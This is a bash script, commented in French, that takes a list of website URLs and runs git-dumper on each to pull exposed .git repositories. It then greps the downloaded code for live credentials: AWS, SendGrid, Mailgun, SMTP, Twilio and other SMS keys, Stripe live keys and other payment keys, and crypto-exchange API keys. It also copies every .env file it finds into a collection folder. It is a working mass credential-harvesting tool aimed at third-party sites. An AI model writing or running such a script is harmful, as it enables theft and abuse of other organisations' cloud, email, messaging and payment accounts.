#!/bin/bash
#export PATH=$HOME/.local/bin:$PATH
mkdir -p "envz"
mkdir tmp
tr -d '\r' < $1 > ./tmp/$1.tmp
for i in $(cat ./tmp/$1.tmp); do
    name=$(echo -n "$i" | cut -d '/' -f3)

git-dumper -j 50 $i $name #git-dumper -h pour savoir comment config proxy, nombre de threads etc

###======================= AMAZON APIKEY ================================
grep --exclude='*.html' -rnP -C25 "AKIA[A-Z0-9]{16}" --binary-files=text $name | cut -c -500 >> Aws.txt

###======================= SENDGRID APIKEY ================================
grep -rnP -C25 "SG\.[\w_-]{16,32}\.[\w_-]{16,64}" --binary-files=text $name | cut -c -500 >> Sendgrid.txt

###======================= MAILGUN APIKEY ================================
grep -rnP -C25 "((?i)(mailgun|mg)(.{0,20})?)?key-[0-9a-z]{32}" --binary-files=text $name | cut -c -500 >> Mailgun_key.txt

###======================= SMTP CREDENTIALS ================================
grep -rniP -C25 "(?:relay\-hosting\.secureserver\.net|express\-relay\.jangosmtp\.net|smtp\-relay\.(?:sendinblue|gamil)\.com)|smtp\.(?:exchange2019\.ionos\.fr|(?:broadband\.rogers|(?:postmarkapp|office365|hushmail|ntlworld|yandex|1and1|gmail|zoho|aol))\.com)|(?:s(?:mtp\.(?:sparkpost|(?:elastice|tipi))mail|ecure\.emailsrvr)\.com|(?:mail\.(?:btopenworld|smtp2go)|in\-v3\.mailjet)\.com|mail\.o2online\.de)|(?:smtp\.(?:deliverabilitymanager|ex1\.secureserver|sendgrid|verizon|orange)\.net|pro\.turbo\-smtp\.com|smtp\.(?:mailgun\.org|aruba\.it)|smtp\.comcast\.net|outbound\.att\.net)|email\-smtp\.(?:(?:(?:(?:(?:ap\-(?:southeast\-[12]|northeast\-[12])|eu\-west\-[1-3]|us\-west\-[12]|us\-east\-[12])|ap\-south\-1)|(?:us\-gov\-west|eu\-north|sa\-east)\-1)|eu\-central\-1)|ca\-central\-1)\.amazonaws\.com|(?:api\.(?:(?:sendinblue\.com|cc\.email)|smtp\.com)|mandrillapp\.com)|(?:presmtp\.ex3\.secureserver\.net|smtp(?:\.mxhichina|cloud\.sohu)\.com)" --binary-files=text $name | cut -c -500 >> Smtp.txt

###======================= TWILIO APIKEY ================================
grep -rnP -C25 "AC[a-z0-9]{32}" --binary-files=text $name | cut -c -500 >> Twilio.txt

###======================= OTHER SMS APIKEY ================================

grep -rnP -C25 "(?:platform\.clickatell|(?:eu\.api\.ovh|dualsms))\.com|api\.(?:(?:p(?:romotexter|livo)|smsfactor|bulksms|infobip|telnyx)\.com|clickatell\.com|txtlocal\.com|movider\.co|skebby\.it)|rest\.(?:gtx\-messaging\.net|(?:clicksend|nexmo)\.com)|sms(?:\.(?:capitolemobile\.com|lws\.fr)|panel\.aruba\.it)|nexmo_(?:secret|api|key)" --binary-files=text $name | cut -c -500 >> Sms.txt

###======================= STRIPE APIKEY ================================
grep -rnP -C25 "(?i)stripe(.{0,20})?[sr]k_live_[0-9a-zA-Z]{24}|(?:sandbox\.powercash21\.com|(?:api(?:\.(?:(?:(?:paysafecard|mollie)|lyra)|klarna)|\-(?:na|oc)\.klarna)|open\-(?:sea|(?:eu|na))\.alipay|gateway\.ixopay|www\.(?:skrill|mypos))\.com|pay\.fondy\.eu)" --binary-files=text $name | cut -c -500 >> Pay-api.txt

###======================= BTC_APIKEY ================================
grep -rnP -C25 "api\.(?:blockchain|c(?:oinbase|rypto))\.com|(?:(?:stream\.crypto|bitpay)|www\.coinqvest)\.com|(?:www\.coinpayments\.net|uat\-(?:stream|api)\.3ona\.co)" --binary-files=text $name | cut -c -500 >> BTC_key.txt
 
 for envi in $(find $name -name ".env*" -type f); do
            cat $envi | tee -a envz/${name}_env.txt
        done
    echo "$i" >> history.txt
    rm -rf $name
done
